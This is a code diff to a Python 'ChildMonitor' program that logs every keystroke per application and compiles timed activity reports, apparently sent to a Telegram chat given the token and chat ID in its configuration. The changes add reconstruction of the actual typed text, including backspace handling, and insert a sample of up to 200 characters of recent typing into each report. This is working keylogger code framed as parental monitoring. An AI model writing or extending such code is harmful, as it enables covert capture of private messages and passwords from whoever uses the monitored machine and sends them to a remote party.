@@ -43,6 +43,7 @@ try:
 
     print(f"Configuration loaded. TELEGRAM_TOKEN: {'*' * len(TELEGRAM_TOKEN) if TELEGRAM_TOKEN else 'NOT SET'}")
     print(f"TELEGRAM_CHAT_ID: {TELEGRAM_CHAT_ID}")
+    print(f"DAILY_INTERVAL: {DAILY_INTERVAL} seconds ({DAILY_INTERVAL / 3600:.1f} hours)")
 
 except Exception as e:
     print(f"Error loading configuration: {e}")
@@ -219,6 +220,11 @@ class ChildMonitor:
             self.last_hwnd = None
             self.hwnd_change_time = time.time()
 
+            # For tracking actual typed content
+            self.typed_content = {'text': '', 'start_time': time.time(), 'last_time': time.time()}
+            self.TYPING_TIMEOUT = 5.0  # Increased timeout for typing sessions
+            self.TYPING_SAMPLE_TIMEOUT = 60.0  # Show samples from the last 60 seconds
+
             print("Initializing PID cache...")
             self.pid_cache = PidCache(PID_CACHE_FILE)
 
@@ -242,6 +248,7 @@ class ChildMonitor:
             threading.Thread(target=self._scheduler_thread, daemon=True).start()
 
             print("ChildMonitor initialized successfully")
+            logger.info(f"Monitor started with DAILY_INTERVAL: {DAILY_INTERVAL} seconds")
 
         except Exception as e:
             print(f"Error initializing ChildMonitor: {e}")
@@ -291,6 +298,10 @@ class ChildMonitor:
                 self._update_activity_time()
                 self.current_proc = proc
 
+                # Only reset typing content if we're switching to a different app
+                if proc != self.current_proc:
+                    self.typed_content = {'text': '', 'start_time': time.time(), 'last_time': time.time()}
+
                 return True
         except Exception as e:
             logger.error(f"Window check error: {e}")
@@ -303,6 +314,24 @@ class ChildMonitor:
                 time.sleep(WINDOW_CHECK_INTERVAL)
             except Exception as e:
                 logger.error(f"Window worker error: {e}")
+
+    def _get_key_representation(self, key):
+        """Get a human-readable representation of the key"""
+        try:
+            if hasattr(key, 'char') and key.char:
+                return key.char
+            elif key == keyboard.Key.space:
+                return " "
+            elif key == keyboard.Key.enter:
+                return "\n"
+            elif key == keyboard.Key.tab:
+                return "\t"
+            elif hasattr(key, 'name'):
+                return f"[{key.name}]"
+            else:
+                return f"[{key}]"
+        except:
+            return f"[unknown_key]"
 
     def _categorize_key(self, key):
         """Categorize keys into meaningful groups"""
@@ -351,13 +380,34 @@ class ChildMonitor:
             if not self.current_proc or self.current_proc in IGNORE_PROCS:
                 return
 
-            # Get key representation
-            try:
-                char = key.char if hasattr(key, 'char') and key.char else f'[{key.name}]'
-            except AttributeError:
-                char = f'[{key}]'
+            now = time.time()
+            key_repr = self._get_key_representation(key)
 
-            entry = f"{datetime.datetime.now():%H:%M:%S}|{self.current_proc}|{char}"
+            # Initialize or continue typing session
+            if now - self.typed_content.get('last_time', 0) > self.TYPING_TIMEOUT:
+                # New typing session
+                self.typed_content = {'text': '', 'start_time': now, 'last_time': now}
+            else:
+                # Continue existing session
+                self.typed_content['last_time'] = now
+
+            # Handle special keys
+            if key == keyboard.Key.backspace:
+                # Remove last character
+                if self.typed_content.get('text'):
+                    self.typed_content['text'] = self.typed_content['text'][:-1]
+            elif key == keyboard.Key.enter:
+                # Add newline
+                self.typed_content['text'] += "\n"
+            elif key == keyboard.Key.tab:
+                # Add tab
+                self.typed_content['text'] += "\t"
+            elif key_repr not in ['[shift]', '[ctrl]', '[alt]', '[cmd]', '[caps_lock]']:
+                # Add character representation
+                self.typed_content['text'] += key_repr
+
+            # Log individual key
+            entry = f"{datetime.datetime.now():%H:%M:%S}|{self.current_proc}|{key_repr}"
             self.log_buffer.append(entry)
 
             # Categorize and track key type
@@ -448,12 +498,13 @@ class ChildMonitor:
             return
 
         try:
-            self._update_activity_time()
-
-            now = time.time()
-            tracking_seconds = now - self.last_report_time
+            # Calculate report period correctly
+            report_end_time = time.time()
+            tracking_seconds = report_end_time - self.last_report_time
             tracking_hours = tracking_seconds / 3600
-            self.last_report_time = now
+
+            # Update activity time before generating report
+            self._update_activity_time()
 
             with self.activity_lock:
                 report = []
@@ -484,7 +535,7 @@ class ChildMonitor:
 
                 # Add process details
                 for entry in report[:15]:
-                    if entry['hours'] < 0.001:  # Skip minimal activity
+                    if entry['hours'] < 0.001 and entry['keystrokes'] == 0:
                         continue
 
                     report_text += (
@@ -509,6 +560,18 @@ class ChildMonitor:
                 if len(report) == 0:
                     report_text += "\nNo significant activity detected."
 
+                # Add typed content sample if available
+                now = time.time()
+                if self.typed_content.get('text') and now - self.typed_content.get('last_time',
+                                                                                   0) < self.TYPING_SAMPLE_TIMEOUT:
+                    sample = self.typed_content['text']
+                    # Only show if we have meaningful content
+                    if sample.strip():
+                        # Truncate to avoid huge messages
+                        sample = sample.strip()
+                        sample = sample[:200] + ('...' if len(sample) > 200 else '')
+                        report_text += f"\n✍️ **Recent Typing Sample:**\n```\n{sample}\n```"
+
                 # Add overall key type statistics
                 if total_keys > 0:
                     all_key_types = defaultdict(int)
@@ -531,8 +594,14 @@ class ChildMonitor:
         except Exception as e:
             logger.error(f"Report error: {e}")
         finally:
+            # Update last report time AFTER generating the report
+            self.last_report_time = time.time()
+
             if not self.exit_event.is_set():
-                self.scheduler.enter(DAILY_INTERVAL, 1, self._send_report)
+                # Schedule next report correctly
+                next_report = time.time() + DAILY_INTERVAL
+                self.scheduler.enterabs(next_report, 1, self._send_report)
+                logger.info(f"Next report scheduled at {datetime.datetime.fromtimestamp(next_report)}")
 
     def _save_queue(self):
         try:
